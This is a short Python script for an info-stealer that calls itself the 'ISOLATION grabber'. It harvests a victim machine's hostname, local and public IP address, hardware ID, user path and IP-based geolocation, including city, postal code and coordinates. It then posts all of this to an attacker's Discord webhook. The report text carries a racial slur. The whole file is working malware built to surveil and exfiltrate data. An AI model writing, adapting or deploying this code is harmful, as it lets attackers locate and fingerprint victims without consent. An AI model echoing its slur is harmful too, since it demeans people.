import os
import discord_webhook
import json
import platform
import socket
import subprocess
import requests
from urllib.request import urlopen
# pre-run needed variables
config_file = open("./CONFIG.json","r")
config = json.load(config_file)

hostname=socket.gethostname()
localIPAddr=socket.gethostbyname(hostname)
IPAddr = requests.get("https://checkip.amazonaws.com")
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

if platform.system()=="Windows":
    hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
else:
    hwid = subprocess.check_output(['cat', '/etc/machine-id'])

pcname = os.path.expanduser("~")

data_link = f"https://ipinfo.io/{IPAddr.text[:-2]}/json"
respons = urlopen(data_link)
data = json.load(respons)
# webhook
embedcont = f'''
---------------------
get grabbed nigga
---------------------
Operating system >> {platform.system()}
OS.name          >> {os.name}
HostName         >> {hostname}
pc name          >> {pcname}
local Ip Address >> {localIPAddr}
Ip Address       >> {IPAddr.text}HWID             >> {hwid}
ORG              >> {data["org"]}
ORG hostname     >> {data["hostname"]}
City             >> {data["city"]}
Region           >> {data["region"]}
Country          >> {data["country"]}
Location         >> {data["loc"]}
Postal           >> {data["postal"]}
'''

def main():
    webhook = discord_webhook.DiscordWebhook(url=str(config["WEBHOOK"]),rate_limit_retry= True)
    embed = discord_webhook.DiscordEmbed(title="ISOLATION",description=embedcont, color="23272A")
    embed.set_timestamp()
    embed.set_footer(text="Grabbed w/ ISOLATION grabber")
    webhook.add_embed(embed=embed)
    webhook.execute()
if __name__== "__main__":
    main()